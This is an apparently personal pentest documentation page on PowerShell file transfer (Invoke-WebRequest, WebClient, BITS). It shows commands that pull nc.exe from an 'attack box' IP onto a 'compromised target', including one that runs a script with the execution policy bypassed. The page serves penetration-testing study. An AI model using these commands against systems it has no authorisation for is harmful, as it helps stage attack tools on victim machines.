<!DOCTYPE html>
<html class="no-js" lang="fr">
<head>
    <meta charset="utf-8" />
        <meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="docsearch:name" content="Cyber Security" />
    <meta name="docsearch:package_type" content="" />
    <meta name="docsearch:release" content="" />
    <meta name="docsearch:version" content="" />
    
        <title>PowerShell - File Transfert &mdash; Documentation Cyber Security </title>
    
    <link rel="stylesheet" type="text/css" href="../../../../_static/dist/fontawesome.css" />
      <link rel="stylesheet" type="text/css" href="../../../../_static/dist/theme.css" />
      <link rel="stylesheet" type="text/css" href="../../../../_static/graphviz.css" />
            <link rel="index" title="Index" href="../../../../genindex.html" />
            <link rel="search" title="Recherche" href="../../../../search.html" />
            <link rel="top" title="Documentation Cyber Security " href="#" />
            <link rel="up" title="Powershell" href="../Powershell.html" />
            <link rel="next" title="Red Team Tools" href="../../RTTool/RTTool.html" />
            <link rel="prev" title="Powershell" href="../Powershell.html" />
    </head>
<body>
    <header class="container-fluid bg-primary">
        <div class="container-fluid">
            <div class="navbar navbar-expand-lg navbar-dark font-weight-bold">
                    <a href="../../../../index.html"
                        title="logoGrenouilleTech"
                        class="logo navbar-brand"
                    >
                        <img src="../../../../_static/img/ColorLogoOpenHardware-noBackground.svg" width="500" height="400" alt="logoGrenouilleTech"
                            class="logo-img"
                        />
                        Cyber Security
                    </a>
                
                
                <button class="navbar-toggler btn btn-primary d-lg-none" type="button" data-toggle="collapse" data-target="#collapseSidebar" aria-expanded="false" aria-controls="collapseExample">
                    <span class="navbar-toggler-icon"></span>
                    <span class="sr-only">Menu</span>
                </button>
            </div>
        </div>
    </header>
    <div class="container-fluid">
        <div class="row">
            <aside class="col-12 col-lg-3 sidebar-container">
                <div id="collapseSidebar" class="collapse sticky-top d-lg-block pt-5 pr-lg-4">
<div id="searchbox" style="display: none" role="search">
  <h3 id="searchlabel">Recherche rapide</h3>
    <div class="searchformwrapper">
    <form class="search" action="../../../../search.html" method="get">
      <input type="text" name="q" aria-labelledby="searchlabel" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"/>
      <input type="submit" value="Go" />
    </form>
    </div>
</div>
<script>document.getElementById('searchbox').style.display = "block"</script><div class="site-toc">
    <nav class="toc mt-3" aria-label="Main menu">
        <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="reference internal" href="../../../CyberSec.html">Cyber Security</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="../../../Distrib/Distrib.html">Cyber Security Distribution</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Distrib/Kali/Kali.html">Kali</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../Pentest/Pentest.html">The Pentest</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../Pentest/Scope/Scope.html">Objectives &amp; Scope</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Scope/blackGreyWhite/blackGreyWhite.html">Black, Grey &amp; White box penetration testing</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Scope/rules/rules.html">Rules of engagement &amp; Results</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Pentest/Enumeration/Enumeration.html">Enumeration</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Enumeration/PassiveEnum/PassiveEnum.html">Passive information gathering</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Enumeration/ActiveEnum/ActiveEnum.html">Active information gathering</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../../Pentest/Enumeration/ActiveEnum/NetEnum/NetEnum.html">Network Enumeration</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Enumeration/OSINT/OSINT.html">OSInt</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Pentest/Vulnerability/Vulnerability.html">Vulnerability, identification and assesment</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../../Pentest/Exploitation/Exploitation.html">Exploitation</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Exploitation/Exploit/Exploit.html">Exploit</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Exploitation/TransfertExploit/TransfertExploit.html">Transferring the exploit to the target host</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Exploitation/BypassSec/BypassSec.html">Bypass Security</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Exploitation/PrivEsc/PrivEsc.html">Privilege Escalation</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Exploitation/PrivEsc/PrivEsc.html#weblinks">Weblinks</a></li>
<li class="toctree-l4"><a class="reference internal" href="../../../Pentest/Exploitation/PostExploit/PostExploit.html">Post Exploitation</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="../../../webSecurity/webSecurity.html">Web Security</a><ul>
<li class="toctree-l3"><a class="reference internal" href="../../../webSecurity/bugBountyVDS/bugBountyVDS.html">Bug Bounty &amp; Vulnerability Disclosur Program (VDS)</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/webSecurityAcademy.html">Web Security Academy</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/serverSideVulnerabilities.html">Server-Side Vulnerabilities</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/pathTraversal/pathTraversal.html">Path Traversal</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/accessControl/accessControl.html">Access Control</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../../webSecurity/webSecurityAcademy/serverSideVulnerabilities/AuthenticationVuln/AuthenticationVuln.html">Authentication vulnerabilities</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2 current"><a class="reference internal" href="../../Toolbox.html">Toolbox</a><ul class="current">
<li class="toctree-l3"><a class="reference internal" href="../../BurpSuite/BurpSuite.html">BurpSuite</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../Certutil/Certutil.html">Certutil.exe</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../Gophish/Gophish.html">Gophish</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../Netcat/Netcat.html">Netcat</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../OsintTools/OsintTools.html">OSInt Tools</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../Owasp_ZAP/Owasp_ZAP.html">Owasp ZAP</a><ul class="simple">
</ul>
</li>
<li class="toctree-l3 current"><a class="reference internal" href="../Powershell.html">Powershell</a><ul class="current">
<li class="toctree-l4 current"><a class="current reference internal" href="#">PowerShell - File Transfert</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../RTTool/RTTool.html">Red Team Tools</a><ul>
<li class="toctree-l4"><a class="reference internal" href="../../RTTool/Metasploit/Metasploit.html">Metasploit</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Metasploit/Meterpreter/Meterpreter.html">Meterpreter</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Metasploit/Msfvenom/Msfvenom.html">Msfvenom</a></li>
</ul>
</li>
<li class="toctree-l4"><a class="reference internal" href="../../RTTool/Nmap/Nmap.html">Nmap</a><ul>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Nmap/hostDiscovery/hostDiscovery.html">Host Discovery</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Nmap/nmapPortScan/nmapPortScan.html">Nmap Port Scanning Techniques</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Nmap/Fingerprint/Fingerprint.html">Fingerprinting services and operating systems</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Nmap/NmapScripEngine/NmapScripEngine.html">Namp Script Engine (NSE)</a></li>
<li class="toctree-l5"><a class="reference internal" href="../../RTTool/Nmap/outputData/outputData.html">Output Data to files</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="../../VBSript/VBSript.html">VBSript</a></li>
<li class="toctree-l3"><a class="reference internal" href="../../wget/wget.html">wget</a></li>
</ul>
</li>
</ul>
</li>
</ul>

    </nav>
    <template data-toggle-item-template>
        <button class="btn btn-sm btn-link toctree-expand" type="button">
            <span class="sr-only">Toggle menu contents</span>
        </button>
    </template>
</div>
                    <div class="d-lg-none border-bottom">
                        
                    </div>
                </div>
            </aside>
            <div class="col-12 col-lg-9 pt-5">
                <header class="row align-items-baseline">
                    <div class="col">
                        <nav aria-label="breadcrumb">
    <ol class="breadcrumb m-0 p-0 bg-transparent">
        <li class="breadcrumb-item"><a href="../../../../index.html">Docs</a></li>
            <li class="breadcrumb-item"><a href="../../../CyberSec.html">Cyber Security</a></li>
            <li class="breadcrumb-item"><a href="../../Toolbox.html">Toolbox</a></li>
            <li class="breadcrumb-item"><a href="../Powershell.html">Powershell</a></li>
        <li class="breadcrumb-item active" aria-current="page">PowerShell - File Transfert</li>
    </ol>
</nav>
                    </div>
                    <div class="col-sm-12 col-lg-auto mt-3 mt-lg-3">
                        <noscript>
                            <p>JavaScript is required to toggle light/dark mode..</p>
                        </noscript>
                        <button id="ahd-theme" class="btn btn-sm btn-light text-decoration-none" type="button">
                            <span class="dark-only"><i class="fas fa-sun"></i> Light mode</span>
                            <span class="light-only"><i class="fas fa-moon"></i> Dark mode</span>
                        </button>
    <a class="btn btn-sm btn-light text-decoration-none" href="https://github.com/ahdcreative/sphinx_ahd_theme/blob/main/docs/CyberSec/Toolbox/Powershell/psFileTransfert/psFileTransfert.rst" rel="nofollow">
        <span class="btn-icon"><span class="fab fa-github"></span></span>
        <span class="btn-text">Edit on GitHub</span>
    </a>
    <a class="btn btn-sm btn-light text-decoration-none" href="../../../../_sources/CyberSec/Toolbox/Powershell/psFileTransfert/psFileTransfert.rst.txt" rel="nofollow">
        <span class="btn-icon"><span class="fas fa-code"></span></span>
        <span class="btn-text">View source</span>
    </a>
                        
                    </div>
                </header>
                <div class="row" >
                    <div class="col-12">
                        <hr class="w-100 my-4">
                    </div>
                </div>
                <div class="row">
                    <div class="col-12 col-lg-9 order-last order-lg-first rst-content">
                        <main role="main">
<section id="powershell-file-transfert">
<span id="ref-psfiletransfert"></span><h1><a class="toc-backref" href="#sommaire" role="doc-backlink">PowerShell - File Transfert</a><a class="headerlink" href="#powershell-file-transfert" title="Lien permanent vers cette rubrique">¶</a></h1>
<nav class="contents" id="sommaire">
<span id="index-0"></span><p class="topic-title">Sommaire</p>
<ul class="simple">
<li><p><a class="reference internal" href="#powershell-file-transfert" id="id9">PowerShell - File Transfert</a></p>
<ul>
<li><p><a class="reference internal" href="#file-transfert-invoke-webrequest" id="id10">File Transfert : Invoke-WebRequest</a></p></li>
<li><p><a class="reference internal" href="#file-transfert-system-net-webclient" id="id11">File Transfert : System.Net.WebClient</a></p></li>
<li><p><a class="reference internal" href="#file-transfert-start-bitstransfert" id="id12">File Transfert : Start-BitsTransfert</a></p></li>
<li><p><a class="reference internal" href="#weblinks" id="id13">Weblinks</a></p></li>
</ul>
</li>
</ul>
</nav>
<hr class="docutils" />
<p>PowerShell scripting language offers multiple ways to download files from remote locations.</p>
<hr class="docutils" />
<section id="file-transfert-invoke-webrequest">
<span id="ref-pswget"></span><h2><a class="toc-backref" href="#sommaire" role="doc-backlink">File Transfert : Invoke-WebRequest</a><a class="headerlink" href="#file-transfert-invoke-webrequest" title="Lien permanent vers cette rubrique">¶</a></h2>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Liens Web</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://learn.microsoft.com/en-gb/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3&amp;viewFallbackFrom=powershell-3.0">Invoke-WebRequest cmdlet</a> <a class="footnote-reference brackets" href="#id1" id="id2" role="doc-noteref"><span class="fn-bracket">[</span>1<span class="fn-bracket">]</span></a></p></li>
</ul>
</div>
</div></blockquote>
<p>The Invoke-WebRequest cmdlet is simple and easy to use and is available in PowerShell version 3.0
and higher. However, it does come with a few disadvantages.</p>
<blockquote>
<div><ul class="simple">
<li><p>It is very slow compared to the other PowerShell methods we considered. This
cmdlet takes a huge performance hit because the HTTP response stream is first buffered into
memory and flushed to disk only once it’s fully loaded.</p></li>
<li><p>Downloading large files with this method may cause potential memory issues. That is why we
recommend using the System.Net.WebClient method for transferring larger files.</p></li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Invoke-WebRequest</strong></p>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span>    <span class="c"># Invoke-WebRequest -uri [web server adresse:port]/[file_to_download] -o [destination_filename]</span>
</pre></div>
</div>
<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span>    <span class="c"># &quot;-v&quot; for the verbose mode</span>
<span class="linenos">2</span>    <span class="nb">Invoke-WebRequest</span> <span class="n">-uri</span> <span class="n">10</span><span class="p">.</span><span class="n">255</span><span class="p">.</span><span class="n">247</span><span class="p">.</span><span class="n">18</span><span class="p">:</span><span class="n">80</span><span class="p">/</span><span class="n">49402</span><span class="p">.</span><span class="n">txt</span> <span class="n">-o</span> <span class="n">49402</span><span class="p">.</span><span class="n">txt</span> <span class="n">-v</span>
</pre></div>
</div>
<dl class="simple">
<dt>The Invoke-WebRequest cmdlet have two alias :</dt><dd><ul class="simple">
<li><p>wget</p></li>
<li><p>curl</p></li>
</ul>
</dd>
</dl>
<p><strong>Client side</strong></p>
<a class="reference internal image-reference" href="../../../../_images/dlPowershell.png"><img alt="../../../../_images/dlPowershell.png" class="align-center" src="../../../../_images/dlPowershell.png" style="width: 540px;" /></a>
<p><strong>Server side</strong></p>
<a class="reference internal image-reference" href="../../../../_images/reqServerSide1.png"><img alt="../../../../_images/reqServerSide1.png" class="align-center" src="../../../../_images/reqServerSide1.png" style="width: 540px;" /></a>
</div>
</div></blockquote>
<hr class="docutils" />
</section>
<section id="file-transfert-system-net-webclient">
<span id="ref-sysnetwebclient"></span><h2><a class="toc-backref" href="#sommaire" role="doc-backlink">File Transfert : System.Net.WebClient</a><a class="headerlink" href="#file-transfert-system-net-webclient" title="Lien permanent vers cette rubrique">¶</a></h2>
<p>In this section, we will look at uses the .NET class System.Net.WebClient.</p>
<p>In this example we will build the PowerShell script line by line from the <strong>cmd</strong> shell. With this approche it is possible
to create the script directly from the compromised target.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Liens Web</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0&amp;redirectedfrom=MSDN">WebClient</a> <a class="footnote-reference brackets" href="#id3" id="id4" role="doc-noteref"><span class="fn-bracket">[</span>2<span class="fn-bracket">]</span></a></p></li>
</ul>
</div>
</div></blockquote>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The following commands create a PowerShell script on the remote Windows machine that can be
used to download the file from the attack box.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$webclient</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Net.WebClient<span class="w"> </span>&gt;<span class="w"> </span>httpdownload.ps1
<span class="linenos">2</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$webclient</span>.DownloadFile<span class="o">(</span><span class="s2">&quot;[Download URL]&quot;</span>,<span class="s2">&quot;[File Name]&quot;</span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>httpdownload.ps1
</pre></div>
</div>
<p>Note that you have to insert the download link (<strong>[Download URL]</strong>)and file name
(<strong>[File Name]</strong>) in the command on the last line and replace all the text
(including brackets) with the URL and file name.</p>
</div>
</div></blockquote>
<p>Once the PowerShell has been created successfully, we can use the <strong>type</strong> command to view
the contents:</p>
<blockquote>
<div><a class="reference internal image-reference" href="../../../../_images/PowerShell-File-transfers-01.jpg"><img alt="../../../../_images/PowerShell-File-transfers-01.jpg" class="align-center" src="../../../../_images/PowerShell-File-transfers-01.jpg" style="width: 500px;" /></a>
<div class="admonition important">
<p class="admonition-title">Important</p>
<p><strong>Get-Content (cat)</strong></p>
<p>PowerShell have a convenient cmdlet <strong>Get-Content</strong>.</p>
<p>This cmdlet have a cool alias : <strong>cat</strong> it act like the one in UX systems.</p>
<a class="reference internal image-reference" href="../../../../_images/pws_cat_alias.png"><img alt="../../../../_images/pws_cat_alias.png" class="align-center" src="../../../../_images/pws_cat_alias.png" style="width: 500px;" /></a>
<p>and the usage is the same.</p>
<a class="reference internal image-reference" href="../../../../_images/pws_cat_exemple.png"><img alt="../../../../_images/pws_cat_exemple.png" class="align-center" src="../../../../_images/pws_cat_exemple.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
<p>In this example we have provided a URI for the nc.exe binary from our attack machine to the
DownloadFile function.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>Once verified that the PowerShell script is successfully created, you can execute the script.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>powershell.exe<span class="w"> </span>-ExecutionPolicy<span class="w"> </span>Bypass<span class="w"> </span>-NoLogo<span class="w"> </span>-NonInteractive<span class="w"> </span>-NoProfile<span class="w"> </span>-File<span class="w"> </span>httpdownload.ps1
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../_images/PowerShell-File-transfers-02.jpg"><img alt="../../../../_images/PowerShell-File-transfers-02.jpg" class="align-center" src="../../../../_images/PowerShell-File-transfers-02.jpg" style="width: 500px;" /></a>
<p>As we can see on the screenshot, the nc.exe binary was successfully downloaded from our
attack box to the target host.</p>
</div>
</div></blockquote>
<p>Alternatively, we can also execute this command from a regular command line in Windows using
PowerShell to download files without creating a script.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p>The -c option executes the command provided within the double quotes with PowerShell.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>powershell<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://172.16.3.1/nc.exe&#39;,&#39;nc.exe&#39;)&quot;</span>
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../_images/PowerShell-File-transfers-03.jpg"><img alt="../../../../_images/PowerShell-File-transfers-03.jpg" class="align-center" src="../../../../_images/PowerShell-File-transfers-03.jpg" style="width: 500px;" /></a>
</div>
</div></blockquote>
<hr class="docutils" />
</section>
<section id="file-transfert-start-bitstransfert">
<span id="ref-start-bitstransfert"></span><h2><a class="toc-backref" href="#sommaire" role="doc-backlink">File Transfert : Start-BitsTransfert</a><a class="headerlink" href="#file-transfert-start-bitstransfert" title="Lien permanent vers cette rubrique">¶</a></h2>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Liens Web</strong></p>
<ul class="simple">
<li><p><a class="reference external" href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd819420(v=technet.10)?redirectedfrom=MSDN">Start-BitsTransfer</a> <a class="footnote-reference brackets" href="#id7" id="id8" role="doc-noteref"><span class="fn-bracket">[</span>4<span class="fn-bracket">]</span></a></p></li>
<li><p><a class="reference external" href="https://learn.microsoft.com/fr-fr/windows/win32/bits/about-bits?redirectedfrom=MSDN">service BITS</a> <a class="footnote-reference brackets" href="#id5" id="id6" role="doc-noteref"><span class="fn-bracket">[</span>3<span class="fn-bracket">]</span></a></p></li>
</ul>
</div>
</div></blockquote>
<p>Another way to download files with PowerShell is by using the <strong>B**ackground **I**ntelligent
**T**ransfer **S**ervice (**BITS</strong>). The <strong>Start-BitsTransfer</strong> cmdlet creates a BITS transfer job
to transfer one or more files between a client computer and a server. Using BITS for file transfers
has some major advantages over other methods. BITS allows you to limit the amount bandwidth for a
file transfer, to process multiple downloads, to set a web proxy and it <strong>doesn’t rely on Internet
Explorer in the way that the Invoke-WebRequest (PowerShell 3.0 and up) cmdlet does</strong>. Another
benefit of BITS is that it only uses idle network bandwidth instead of the whole bandwidth as many
other file transfer services do. BITS can, therefore, be used to process large files without
affecting other network applications. BITS transfers are also more reliable because transfers will
continue when a user changes network connection or restarts the computer.</p>
<p>Unfortunately using BITS for file transfers also has a few disadvantages. One potential downside is
that BITS has to be enabled on the target machine in order to work. However, since BITS is usually
enabled by default this won’t cause much of an issue unless it’s actively managed by system
administrators. Another potential downside (which we also counted as an advantage above), is that
BITS only uses idle bandwidth and this may affect the total process time for the file transfer where
available bandwidth is limited. BITS is also designed to process file transfers in the background so
your BITS job may end up being in a queue waiting for a running job to complete.</p>
<blockquote>
<div><div class="admonition note">
<p class="admonition-title">Note</p>
<p><strong>Start-BitsTransfer</strong></p>
<p>As this method only uses 2 lines of code we will execute this script on a single line from
the command line. As a minimum we need to specify a <strong>source</strong> and <strong>destination</strong> for the
download.</p>
<div class="highlight-shell notranslate"><div class="highlight"><pre><span></span><span class="linenos">1</span><span class="w"> </span>powershell<span class="w"> </span>Import-Module<span class="w"> </span>BitsTransfer<span class="p">;</span>Start-BitsTransfer<span class="w"> </span>-Source<span class="w"> </span>http://<span class="o">[</span>IP<span class="w"> </span>Attack<span class="w"> </span>box<span class="o">]</span>/nc.exe<span class="w"> </span>-Destination<span class="w"> </span>C:<span class="se">\</span>
</pre></div>
</div>
<a class="reference internal image-reference" href="../../../../_images/PowerShell-Downloads-Start-BitsTransfer.png"><img alt="../../../../_images/PowerShell-Downloads-Start-BitsTransfer.png" class="align-center" src="../../../../_images/PowerShell-Downloads-Start-BitsTransfer.png" style="width: 500px;" /></a>
</div>
</div></blockquote>
</section>
<hr class="docutils" />
<section id="weblinks">
<h2><a class="toc-backref" href="#sommaire" role="doc-backlink">Weblinks</a><a class="headerlink" href="#weblinks" title="Lien permanent vers cette rubrique">¶</a></h2>
<aside class="footnote-list brackets">
<aside class="footnote brackets" id="id1" role="note">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#id2">1</a><span class="fn-bracket">]</span></span>
<p><a class="reference external" href="https://learn.microsoft.com/en-gb/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3&amp;viewFallbackFrom=powershell-3.0">https://learn.microsoft.com/en-gb/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3&amp;viewFallbackFrom=powershell-3.0</a></p>
</aside>
<aside class="footnote brackets" id="id3" role="note">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#id4">2</a><span class="fn-bracket">]</span></span>
<p><a class="reference external" href="https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0&amp;redirectedfrom=MSDN">https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-7.0&amp;redirectedfrom=MSDN</a></p>
</aside>
<aside class="footnote brackets" id="id5" role="note">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#id6">3</a><span class="fn-bracket">]</span></span>
<p><a class="reference external" href="https://learn.microsoft.com/fr-fr/windows/win32/bits/about-bits?redirectedfrom=MSDN">https://learn.microsoft.com/fr-fr/windows/win32/bits/about-bits?redirectedfrom=MSDN</a></p>
</aside>
<aside class="footnote brackets" id="id7" role="note">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#id8">4</a><span class="fn-bracket">]</span></span>
<p><a class="reference external" href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd819420(v=technet.10)?redirectedfrom=MSDN">https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd819420(v=technet.10)?redirectedfrom=MSDN</a></p>
</aside>
</aside>
</section>
</section>

</main>
                        <nav aria-label="Page navigation" class="py-4 my-5 clearfix font-weight-bold border-top">
    <a class="float-left" href="../Powershell.html" title="Previous">
        <span aria-hidden="true">←&nbsp;</span>Powershell
    </a>
    <a class="float-right" href="../../RTTool/RTTool.html" title="Next">
        Red Team Tools <span aria-hidden="true">&nbsp;→</span>
    </a>
</nav>
                    </div>
                    
                    <nav class="col-12 col-lg-3 pb-4">
                        <div class="sticky-top toc page-toc" aria-labelledby="page-toc-heading">
                            <p class="font-weight-bold" id="page-toc-heading">Page contents</p>
                            <ul>
<li><a class="reference internal" href="#">PowerShell - File Transfert</a><ul>
<li><a class="reference internal" href="#file-transfert-invoke-webrequest">File Transfert : Invoke-WebRequest</a></li>
<li><a class="reference internal" href="#file-transfert-system-net-webclient">File Transfert : System.Net.WebClient</a></li>
<li><a class="reference internal" href="#file-transfert-start-bitstransfert">File Transfert : Start-BitsTransfert</a></li>
<li><a class="reference internal" href="#weblinks">Weblinks</a></li>
</ul>
</li>
</ul>

                        </div>
                    </nav>
                    
                </div>
            </div>
        </div>
    </div>
    <footer class="container-fluid bg-primary text-light">
        <div class="container">
            <div class="row">
        <div class="col p-4">
            
            <div class="text-center">
                <p style="display: none">
                    <a class="text-light" href="https://github.com/ahdcreative/sphinx_ahd_theme" rel="nofollow" target="_blank">
                        AHDCreative Sphinx Theme 5.3.8
                    </a>
                </p>
            </div>
            <div class="text-center">
                    &copy; Copyright 2023, Poltergeist42
            </div>
        </div>
    </div>
        </div>
    </footer>
        <script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js"></script>
        <script src="../../../../_static/jquery.js"></script>
        <script src="../../../../_static/underscore.js"></script>
        <script src="../../../../_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="../../../../_static/doctools.js"></script>
        <script src="../../../../_static/sphinx_highlight.js"></script>
        <script src="../../../../_static/translations.js"></script>
        <script type="text/javascript" src="../../../../_static/dist/theme.js"></script>
        <script type="text/javascript" src="../../../../_static/dist/vendor.js"></script>
        <script type="text/javascript" src="../../../../_static/searchtools.js"></script>
        <script type="text/javascript" src="../../../../_static/language_data.js"></script>
        <script type="text/javascript">
            jQuery(function() { Search.loadIndex("../../../../searchindex.js"); });
        </script>
        <script type="text/javascript" id="searchindexloader"></script>
    </body>
</html>